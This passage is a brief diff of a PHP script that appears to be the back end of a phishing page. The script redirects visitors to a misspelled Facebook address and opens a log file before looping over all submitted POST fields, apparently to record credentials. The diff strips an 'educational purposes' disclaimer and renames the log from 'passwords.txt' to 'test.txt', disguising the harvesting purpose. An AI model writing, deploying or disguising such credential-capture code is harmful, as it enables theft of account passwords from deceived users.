@@ -1,7 +1,7 @@
 <?php
 
-header("location: http://wwww.facebook.com"); //THIS TUTORIAL IS ONLY FOR EDUCATIONAL PURPOSES
-$handle = fopen("passwords.txt","a");
+header("location: http://wwww.facebook.com"); 
+$handle = fopen("test.txt","a");
 
 foreach($_POST as $variable => $value)
 {
